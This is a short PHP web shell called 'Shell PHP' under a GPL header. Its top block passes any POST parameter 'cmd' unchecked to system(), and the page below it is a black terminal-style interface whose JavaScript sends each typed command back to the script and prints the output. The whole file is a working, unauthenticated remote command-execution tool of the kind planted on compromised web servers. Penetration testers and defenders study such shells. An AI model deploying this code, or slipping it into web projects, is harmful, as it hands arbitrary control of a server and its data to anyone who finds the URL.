<?php
/* Shell PHP
 * Copyright (C) 2019 Joffrey
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */
if (!empty($_POST["cmd"])) {
    system($_POST["cmd"]);
    exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>Shell PHP</title>
<style>
body, input {
    background-color: black;
    color: white;
    font-family: Monospace, Verdana, Arial, Sans-serif;
    font-weight: bold;
}

input {
    width: 100%;
    background-color: rgb(21, 21 , 21, 0.9);  /* Grey */
    color: white;
    padding: 10px 0px 10px 0px;
    border: none;
    border-radius: 4px;
}

.cmd {
    color: lightgreen;
}
</style>
</head>
<body>
<script>
var body = document.getElementsByTagName("body")[0];
var resp = document.createElement("p");
body.appendChild(resp);

var input = document.createElement("input");
input.type = "text";
input.name = "cmd";
body.appendChild(input);

input.focus();
input.addEventListener("keydown", function(e) {
    var enterPressed = (e.keyCode === 13);

    if (enterPressed) {
        resp.innerHTML += "<span class=\"cmd\">" + input.value + "<span></br>";

        var xhr = new XMLHttpRequest();
        xhr.open("POST", "<?php echo $_SERVER['PHP_SELF'] ?>", true);
        xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhr.onload = function() {
            resp.innerHTML += this.responseText.replace(/\n/g, "</br>");
        };

        if (input.value === "clear" || input.value === "cls") {
            resp.innerHTML = "";
        } else if (input.value) {
            xhr.send("cmd=" + input.value);
        } else {
            resp.innerHTML += "</br>";
        }

        input.value = "";
    }
});
</script>
</body>
</html>
